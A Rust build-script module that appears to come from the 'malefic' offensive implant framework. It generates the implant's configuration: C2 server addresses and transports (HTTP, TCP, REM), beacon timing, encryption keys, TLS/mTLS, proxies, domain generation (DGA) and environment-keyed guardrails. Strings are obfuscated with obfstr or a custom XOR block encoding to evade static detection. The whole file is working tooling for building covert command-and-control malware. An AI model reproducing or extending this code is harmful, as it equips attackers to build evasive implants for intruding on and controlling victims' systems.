use super::config_3rd::update_3rd_toml;
use crate::config::{
    BasicConfig, BuildConfig, GuardrailConfig, ImplantConfig, ProxyConfig, TargetConfig,
};
use crate::{log_step, log_success, FEATURES};
use lazy_static::lazy_static;
use std::fs;
use std::fs::File;
use std::io::Write;
use toml_edit::{Array, DocumentMut};
use url::Url;

static CONFIG_FILE_GENE_PATH: &str = "malefic-core/src/config/mod.rs";
static CONFIG_CORE_TOML_PATH: &str = "malefic-core/Cargo.toml";

lazy_static! {
    static ref CONFIG_CORE_PATH: String = "malefic-core/src/config/mod.rs".to_string();
}

pub fn update_core_config(
    server: &BasicConfig,
    _implant_config: &ImplantConfig,
    build_config: Option<&BuildConfig>,
) {
    log_step!("Updating core configuration...");

    // 验证配置
    if let Err(e) = server.validate_targets() {
        panic!("Configuration validation failed: {}", e);
    }

    let mut file = File::create(CONFIG_FILE_GENE_PATH).unwrap();

    // 生成配置内容
    let use_obfstr = build_config.map(|cfg| cfg.obfstr).unwrap_or(true);
    let config_content = generate_multi_protocol_config(server, use_obfstr);

    file.write_all(config_content.as_bytes())
        .expect("Failed to write config file");

    log_success!("Core configuration has been updated successfully");
}

fn generate_multi_protocol_config(server: &BasicConfig, use_obfstr: bool) -> String {
    let mut config = String::new();

    // 生成模块导入
    config.push_str(&generate_module_imports());

    if !use_obfstr {
        config.push_str(&generate_xor_support_section(server));
    }

    // 生成基础配置
    config.push_str(&generate_basic_config_section(server, use_obfstr));

    // 生成服务器配置
    config.push_str(&generate_server_configs_section(server, use_obfstr));

    // 结束lazy_static块
    config.push_str("}\n");

    config
}

fn generate_module_imports() -> String {
    r#"mod config;

use std::collections::HashMap;
pub use config::{
    ServerConfig,
    ProtocolType,
    TransportConfig,
    // TCP
    TcpConfig,
    SocketOptions,
    // HTTP
    HttpRequestConfig,
    // REM
    RemConfig,
    // TLS
    TlsConfig,
    ProxyConfig,
    // Guardrail
    GuardrailConfig,
};
use lazy_static::lazy_static;

"#
    .to_string()
}

fn generate_basic_config_section(server: &BasicConfig, use_obfstr: bool) -> String {
    let mut config = format!(
        r#"lazy_static! {{
    // 基础配置
    pub static ref CRON: String = obfstr::obfstr!("{}").to_string();
    pub static ref JITTER: f64 = {}f64;
    // 服务器容错配置
    pub static ref GLOBAL_RETRY: u32 = {};                // 已注册情况下的全局重试次数
    pub static ref SERVER_RETRY: u32 = {};             // 单个服务器最大重试次数
"#,
        server.cron, // 使用cron表达式
        server.jitter,
        server.global_retry,
        server.server_retry,
    );

    config.push_str("    // 加密配置\n");
    if use_obfstr {
        config.push_str(&format!(
            r#"    pub static ref NAME: String = obfstr::obfstr!("{}").to_string();
    pub static ref KEY: Vec<u8> = obfstr::obfstr!("{}").into();
"#,
            server.name, server.key
        ));
    } else {
        config.push_str(
            r#"    pub static ref NAME: String = decode_string_from_block(&NAME_BLOCK);
    pub static ref KEY: Vec<u8> = decode_bytes_from_block(&KEY_BLOCK);
"#,
        );
    }

    // 生成代理配置
    config.push_str(&generate_proxy_config_section(&server.proxy));

    if server.secure.enable {
        config.push_str(&format!(
            r#"    pub static ref AGE_PRIVATE_KEY: String = obfstr::obfstr!("{age_private_key}").to_string();
    pub static ref AGE_PUBLIC_KEY: String = obfstr::obfstr!("{age_public_key}").to_string();
"#,
            age_private_key = server.secure.private_key,
            age_public_key = server.secure.public_key
        ));
    }

    // 添加DGA配置
    config.push_str(&generate_dga_config_section(server));

    // 添加Guardrail配置
    config.push_str(&generate_guardrail_config_section(&server.guardrail));

    config
}

fn generate_proxy_config_section(proxy_config: &ProxyConfig) -> String {
    let mut config = String::new();

    // 生成代理配置的三层逻辑
    config.push_str(&format!(
        r#"    pub static ref USE_ENV_PROXY: bool = {};
    pub static ref PROXY_URL: String = obfstr::obfstr!("{}").to_string();
"#,
        proxy_config.use_env_proxy, proxy_config.url
    ));

    // 如果有具体的 URL，解析并生成传统配置（向后兼容）
    if !proxy_config.url.is_empty() {
        if let Ok(proxy_url) = Url::parse(&proxy_config.url) {
            let scheme = proxy_url.scheme().to_string();
            let host = proxy_url.host_str().unwrap_or("").to_string();
            let port =
                proxy_url
                    .port()
                    .map(|p| p.to_string())
                    .unwrap_or_else(|| match scheme.as_str() {
                        "http" | "https" => "8080".to_string(),
                        "socks5" | "socks" => "1080".to_string(),
                        _ => "8080".to_string(),
                    });
            let username = proxy_url.username().to_string();
            let password = proxy_url.password().unwrap_or("").to_string();

            config.push_str(&format!(
                r#"    pub static ref PROXY_SCHEME: String = obfstr::obfstr!("{scheme}").to_string();
    pub static ref PROXY_HOST: String = obfstr::obfstr!("{host}").to_string();
    pub static ref PROXY_PORT: String = obfstr::obfstr!("{port}").to_string();
    pub static ref PROXY_USERNAME: String = obfstr::obfstr!("{username}").to_string();
    pub static ref PROXY_PASSWORD: String = obfstr::obfstr!("{password}").to_string();
"#,
                scheme = scheme,
                host = host,
                port = port,
                username = username,
                password = password
            ));
        } else {
            // 如果 URL 解析失败，生成空配置
            config.push_str(&format!(
                r#"    pub static ref PROXY_SCHEME: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_HOST: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_PORT: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_USERNAME: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_PASSWORD: String = obfstr::obfstr!("").to_string();
"#
            ));
        }
    } else {
        // 没有 URL 时生成空配置
        config.push_str(&format!(
            r#"    pub static ref PROXY_SCHEME: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_HOST: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_PORT: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_USERNAME: String = obfstr::obfstr!("").to_string();
    pub static ref PROXY_PASSWORD: String = obfstr::obfstr!("").to_string();
"#
        ));
    }

    config
}

fn generate_dga_config_section(server: &BasicConfig) -> String {
    if server.dga.enable {
        format!(
            r#"    // DGA配置
    pub static ref DGA_ENABLE: bool = true;
    pub static ref DGA_KEY: String = obfstr::obfstr!("{}").to_string();
    pub static ref DGA_INTERVAL_HOURS: u32 = {};
"#,
            server.dga.key, server.dga.interval_hours
        )
    } else {
        r#"    // DGA配置（已禁用）
    pub static ref DGA_ENABLE: bool = false;
    pub static ref DGA_KEY: String = String::new();
    pub static ref DGA_INTERVAL_HOURS: u32 = 2;
"#
        .to_string()
    }
}

fn generate_server_configs_section(server: &BasicConfig, use_obfstr: bool) -> String {
    let mut config = String::from("    // 多服务器配置 - 使用Vec保持配置顺序\n");
    config.push_str("    pub static ref SERVER_CONFIGS: Vec<ServerConfig> = {\n");
    config.push_str("        let mut configs = Vec::new();\n");

    for (idx, target) in server.targets.iter().enumerate() {
        config.push_str(&generate_single_server_config(
            target, server, use_obfstr, idx,
        ));
    }

    config.push_str("        configs\n");
    config.push_str("    };\n\n");
    config
}

fn generate_single_server_config(
    target: &TargetConfig,
    basic_config: &BasicConfig,
    use_obfstr: bool,
    index: usize,
) -> String {
    let protocol = target.detect_protocol();
    let protocol_type = match protocol.as_str() {
        "http" => "Http",
        "tcp" => "Tcp",
        "rem" => "REM", // REM通常基于HTTP传输
        _ => "Tcp",
    };

    let address_expr = if use_obfstr {
        format!("obfstr::obfstr!(\"{}\").to_string()", target.address)
    } else {
        format!("decode_string_from_block(&SERVER_ADDRESS_BLOCKS[{index}])")
    };

    let mut config = format!(
        r#"        configs.push(
            ServerConfig {{
                address: {},
                protocol: ProtocolType::{},
"#,
        address_expr, protocol_type
    );

    // 生成传输配置
    config.push_str(&generate_transport_config(target));

    // 生成TLS配置
    config.push_str(&generate_tls_config_for_target(target, basic_config));

    // 生成代理配置
    config.push_str(&generate_proxy_config_for_target(target, basic_config));

    // 生成域名后缀配置
    config.push_str(&generate_domain_suffix_config(target));

    config.push_str("            }\n");
    config.push_str("        );\n\n");
    config
}

fn generate_transport_config(target: &TargetConfig) -> String {
    if let Some(http_config) = &target.http {
        let _host = target.get_host();
        let mut headers_code = String::new();

        // 生成Host头部
        headers_code.push_str(&format!(
            "                        headers.insert(obfstr::obfstr!(\"Host\").to_string(), obfstr::obfstr!(\"{}\").to_string());\n",
            target.address
        ));

        // 生成其他头部
        for (key, value) in &http_config.headers {
            if key != "Host" {
                // Host已经单独处理
                headers_code.push_str(&format!(
                    "                        headers.insert(obfstr::obfstr!(\"{}\").to_string(), obfstr::obfstr!(\"{}\").to_string());\n",
                    key, value
                ));
            }
        }

        format!(
            r#"                transport_config: TransportConfig::Http(HttpRequestConfig {{
                    method: obfstr::obfstr!("{}").to_string(),
                    path: obfstr::obfstr!("{}").to_string(),
                    version: obfstr::obfstr!("{}").to_string(),
                    headers: {{
                        let mut headers = HashMap::new();
{}                        headers
                    }},
                }}),
"#,
            http_config.method, http_config.path, http_config.version, headers_code
        )
    } else if let Some(rem_config) = &target.rem {
        format!(
            r#"                transport_config: TransportConfig::Rem(RemConfig {{
                    link: obfstr::obfstr!("-m proxy -l memory+socks://:@memory -c {rem_link}").to_string(),
                }}),
"#,
            rem_link = rem_config.link
        )
    } else {
        // 默认TCP配置
        "                transport_config: TransportConfig::Tcp(TcpConfig {}),\n".to_string()
    }
}

fn generate_tls_config_for_target(target: &TargetConfig, _basic_config: &BasicConfig) -> String {
    // 直接处理 target.tls 的 Option
    if let Some(tls_config) = &target.tls {
        if tls_config.enable {
            let sni = if tls_config.sni.is_empty() {
                target.get_host()
            } else {
                tls_config.sni.clone()
            };

            let mtls_code = if let Some(mtls) = &tls_config.mtls {
                format!(
                    r#"mtls_config: Some(MTLSConfig {{
                            enable: true,
                            client_cert: include_bytes!("{}").to_vec(),
                            client_key: include_bytes!("{}").to_vec(),
                            server_ca: include_bytes!("{}").to_vec(),
                        }}),
"#,
                    mtls.client_cert, mtls.client_key, mtls.server_ca
                )
            } else {
                "mtls_config: None,\n".to_string()
            };

            let tls_code = format!(
                r#"                tls_config: Some(TlsConfig {{
                        enable: true,
                        version: obfstr::obfstr!("{}").to_string(),
                        sni: obfstr::obfstr!("{}").to_string(),
                        skip_verification: {},
                        {}
                    }}),
"#,
                tls_config.version, sni, tls_config.skip_verification, mtls_code
            );

            tls_code
        } else {
            "                tls_config: None,\n".to_string()
        }
    } else {
        // target 没有 TLS 配置，返回 None
        "                tls_config: None,\n".to_string()
    }
}

fn generate_proxy_config_for_target(target: &TargetConfig, basic_config: &BasicConfig) -> String {
    // 优先使用目标特定的代理配置，否则使用全局配置
    let proxy_config = target.proxy.as_ref().unwrap_or(&basic_config.proxy);

    // 检查是否有代理配置
    if !proxy_config.url.is_empty() {
        if let Ok(proxy_url) = Url::parse(&proxy_config.url) {
            format!(
                r#"                proxy_config: Some(ProxyConfig {{
                    proxy_type: "{}".to_string(),
                    host: obfstr::obfstr!("{}").to_string(),
                    port: {},
                    username: obfstr::obfstr!("{}").to_string(),
                    password: obfstr::obfstr!("{}").to_string(),
                }}),
"#,
                proxy_url.scheme(),
                proxy_url.host_str().unwrap_or(""),
                proxy_url
                    .port()
                    .unwrap_or_else(|| match proxy_url.scheme() {
                        "http" | "https" => 8080,
                        "socks5" | "socks" => 1080,
                        _ => 8080,
                    }),
                proxy_url.username(),
                proxy_url.password().unwrap_or("")
            )
        } else {
            "                proxy_config: None,\n".to_string()
        }
    } else {
        "                proxy_config: None,\n".to_string()
    }
}

fn generate_domain_suffix_config(target: &TargetConfig) -> String {
    if let Some(ref suffix) = target.domain_suffix {
        format!(
            r#"                domain_suffix: Some(obfstr::obfstr!("{}").to_string()),
"#,
            suffix
        )
    } else {
        "                domain_suffix: None,\n".to_string()
    }
}

fn generate_xor_support_section(server: &BasicConfig) -> String {
    if server.key.is_empty() {
        panic!("basic.key cannot be empty when obfstr is disabled");
    }

    const BLOCK_LEN: usize = 64;
    let xor_key_bytes = server.key.as_bytes();
    let xor_literal = format!("b{:?}", server.key);

    let mut section = String::new();
    section.push_str(&format!(
        "const XOR_KEY: &[u8; {len}] = {literal};\nconst BLOCK_LEN: usize = {block_len};\n",
        len = xor_key_bytes.len(),
        literal = xor_literal,
        block_len = BLOCK_LEN
    ));

    let name_block = encode_block_bytes(&server.name, xor_key_bytes);
    section.push_str("const NAME_BLOCK: [u8; BLOCK_LEN] = [\n");
    section.push_str(&format!("{}\n", format_block(&name_block, "    ")));
    section.push_str("];\n");

    let key_block = encode_block_bytes(&server.key, xor_key_bytes);
    section.push_str("const KEY_BLOCK: [u8; BLOCK_LEN] = [\n");
    section.push_str(&format!("{}\n", format_block(&key_block, "    ")));
    section.push_str("];\n");

    if server.targets.is_empty() {
        section.push_str("const SERVER_ADDRESS_BLOCKS: [[u8; BLOCK_LEN]; 0] = [];\n");
    } else {
        section.push_str(&format!(
            "const SERVER_ADDRESS_BLOCKS: [[u8; BLOCK_LEN]; {}] = [\n",
            server.targets.len()
        ));
        for target in &server.targets {
            let addr_block = encode_block_bytes(&target.address, xor_key_bytes);
            section.push_str("    [\n");
            section.push_str(&format!("{}\n", format_block(&addr_block, "        ")));
            section.push_str("    ],\n");
        }
        section.push_str("];\n");
    }

    section.push_str(
        r#"
fn decode_string_from_block(block: &[u8]) -> String {
    let mut decoded = Vec::new();
    for (idx, &byte) in block.iter().enumerate() {
        let key = XOR_KEY[idx % XOR_KEY.len()];
        if byte == key {
            break;
        }
        decoded.push(byte ^ key);
    }
    String::from_utf8(decoded).unwrap_or_default()
}

fn decode_bytes_from_block(block: &[u8]) -> Vec<u8> {
    let mut decoded = Vec::new();
    for (idx, &byte) in block.iter().enumerate() {
        let key = XOR_KEY[idx % XOR_KEY.len()];
        if byte == key {
            break;
        }
        decoded.push(byte ^ key);
    }
    decoded
}

"#,
    );

    section
}

fn encode_block_bytes(value: &str, key_bytes: &[u8]) -> Vec<u8> {
    const BLOCK_LEN: usize = 64;
    if key_bytes.is_empty() {
        panic!("xor key cannot be empty");
    }
    let value_bytes = value.as_bytes();
    if value_bytes.len() > BLOCK_LEN {
        panic!(
            "value '{}' exceeds {} bytes required by block encoding",
            value, BLOCK_LEN
        );
    }

    let mut block = vec![0u8; BLOCK_LEN];
    for idx in 0..BLOCK_LEN {
        let key_byte = key_bytes[idx % key_bytes.len()];
        if idx < value_bytes.len() {
            block[idx] = value_bytes[idx] ^ key_byte;
        } else {
            block[idx] = key_byte;
        }
    }
    block
}

fn format_block(block: &[u8], indent: &str) -> String {
    block
        .chunks(16)
        .map(|chunk| {
            let line = chunk
                .iter()
                .map(|byte| format!("0x{:02X}", byte))
                .collect::<Vec<_>>()
                .join(", ");
            format!("{}{}", indent, line)
        })
        .collect::<Vec<_>>()
        .join(",\n")
}

pub fn update_core_toml(server: &BasicConfig, implant: &ImplantConfig) {
    log_step!("Updating core Cargo.toml...");
    let cargo_toml_content =
        fs::read_to_string(CONFIG_CORE_TOML_PATH).expect("Failed to read Cargo.toml file");

    let mut cargo_toml: DocumentMut = cargo_toml_content
        .parse()
        .expect("Failed to parse Cargo.toml file");

    if let Some(features) = cargo_toml[&FEATURES].as_table_mut() {
        let mut default_feature = Array::new();
        if !implant.runtime.is_empty() {
            default_feature.push(implant.runtime.clone());
        } else {
            default_feature.push("tokio".to_string());
        }
        if implant.hot_load {
            default_feature.push("hot_load".to_string());
        }

        if implant.register_info {
            default_feature.push("register_info".to_string());
        }

        if !server.proxy.url.is_empty() || server.proxy.use_env_proxy {
            default_feature.push("proxy".to_string());
            // 简化features，只使用proxy这一个feature
            // if server.proxy.url.contains("socks5") {
            //     default_feature.push("socks5_proxy".to_string());
            // } else if server.proxy.url.contains("http") {
            //     default_feature.push("http_proxy".to_string());
            // }
        }

        // match server.protocol.as_str() {
        //     "tcp" => {
        //         default_feature.push("transport_tcp".to_string());
        //     }
        //     "http" => {
        //         default_feature.push("transport_http".to_string());
        //     }
        //     "rem" => {
        //         default_feature.push("transport_rem".to_string());
        //     }
        //     _ => {}
        // }

        let used_protocols = server.get_used_protocols();
        for protocol in used_protocols {
            match protocol.as_str() {
                "tcp" => {
                    default_feature.push("transport_tcp".to_string());
                }
                "http" => {
                    default_feature.push("transport_http".to_string());
                }
                "rem" => {
                    default_feature.push("transport_rem".to_string());
                }
                _ => {}
            }
        }

        if server.has_tls_enabled() {
            default_feature.push("tls".to_string());

            // 检查mTLS
            // let has_mtls = server.tls.mtls.as_ref().map_or(false, |m| m.enable) ||
            //     server.targets.iter().any(|t| {
            //         t.tls.as_ref().and_then(|tls| tls.mtls.as_ref()).map_or(false, |m| m.enable)
            //     });

            let has_mtls = server.targets.iter().any(|t| {
                t.tls
                    .as_ref()
                    .and_then(|tls| tls.mtls.as_ref())
                    .map_or(false, |m| m.enable)
            });

            if has_mtls {
                default_feature.push("mtls".to_string());
            }
        }

        // Handle third-party module configuration
        if implant.enable_3rd {
            default_feature.push("malefic-3rd".to_string());
            // Update malefic-3rd Cargo.toml
            update_3rd_toml(&implant.third_modules);
        }

        // Handle DGA configuration
        if server.dga.enable {
            default_feature.push("dga".to_string());
        }

        features["default"] = toml_edit::Item::Value(default_feature.into());
    }
    fs::write(CONFIG_CORE_TOML_PATH, cargo_toml.to_string())
        .expect("Failed to write updated Cargo.toml file");
    log_success!(
        "Core Cargo.toml has been updated at {}",
        CONFIG_CORE_TOML_PATH
    );
}

fn generate_guardrail_config_section(guardrail_config: &GuardrailConfig) -> String {
    if !guardrail_config.enable {
        // 如果guardrail未启用，生成默认的空配置
        return r#"
    pub static ref GUARDRAIL_CONFIG: GuardrailConfig = GuardrailConfig {
        ip_addresses: vec![],
        usernames: vec![],
        server_names: vec![],
        domains: vec![],
        require_all: true,
    };

"#
        .to_string();
    }

    // 生成IP地址列表
    let ip_addresses = guardrail_config
        .ip_addresses
        .iter()
        .map(|ip| format!("obfstr::obfstr!(\"{}\").to_string()", ip))
        .collect::<Vec<_>>()
        .join(",\n            ");

    // 生成用户名列表
    let usernames = guardrail_config
        .usernames
        .iter()
        .map(|user| format!("obfstr::obfstr!(\"{}\").to_string()", user))
        .collect::<Vec<_>>()
        .join(",\n            ");

    // 生成服务器名列表
    let server_names = guardrail_config
        .server_names
        .iter()
        .map(|server| format!("obfstr::obfstr!(\"{}\").to_string()", server))
        .collect::<Vec<_>>()
        .join(",\n            ");

    // 生成域名列表
    let domains = guardrail_config
        .domains
        .iter()
        .map(|domain| format!("obfstr::obfstr!(\"{}\").to_string()", domain))
        .collect::<Vec<_>>()
        .join(",\n            ");

    format!(
        r#"
    pub static ref GUARDRAIL_CONFIG: GuardrailConfig = GuardrailConfig {{
        ip_addresses: vec![
            {}
        ],
        usernames: vec![
            {}
        ],
        server_names: vec![
            {}
        ],
        domains: vec![
            {}
        ],
        require_all: {},
    }};

"#,
        if ip_addresses.is_empty() {
            "".to_string()
        } else {
            format!("\n            {}", ip_addresses)
        },
        if usernames.is_empty() {
            "".to_string()
        } else {
            format!("\n            {}", usernames)
        },
        if server_names.is_empty() {
            "".to_string()
        } else {
            format!("\n            {}", server_names)
        },
        if domains.is_empty() {
            "".to_string()
        } else {
            format!("\n            {}", domains)
        },
        guardrail_config.require_all
    )
}
